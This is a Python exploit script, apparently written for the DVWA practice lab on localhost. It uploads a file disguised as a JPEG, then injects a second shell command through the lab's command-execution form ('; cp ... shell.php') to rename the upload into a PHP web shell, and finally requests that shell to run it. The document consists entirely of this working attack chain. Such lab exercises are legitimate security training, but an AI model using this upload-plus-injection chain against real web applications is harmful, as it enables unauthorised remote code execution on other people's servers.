from requests import Session,post,get
import requests
import sys
from bs4 import BeautifulSoup


file_name = sys.argv[1]

uTarget = "http://localhost/DVWA/vulnerabilities/upload/"
exec_url = "http://localhost/DVWA/hackable/uploads/shell.php"
uPayload = {"uploaded": (file_name,open(file_name,"r"),"image/jpeg")}
uParams = {"MAX_FILE_SIZE": "100000", "uploaded": file_name, "Upload": "Upload"}
uCookie = {"security": "high", "PHPSESSID": "pnlr7s1hcdjkdeh8s7k3u3tmuk"}

mTarget = "http://localhost/DVWA/vulnerabilities/exec/"
mParams = {"ip": "; cp /var/www/html/DVWA/hackable/uploads/{} /var/www/html/DVWA/hackable/uploads/shell.php".format(file_name), "Submit": "Submit"}
mCookie = {"security": "low", "PHPSESSID": "pnlr7s1hcdjkdeh8s7k3u3tmuk"}

file_upload = requests.post(url=uTarget, data=uParams, files=uPayload, cookies=uCookie)
rename = requests.post(url=mTarget, data=mParams, cookies=mCookie)
execute = requests.get(url=exec_url, cookies=uCookie)
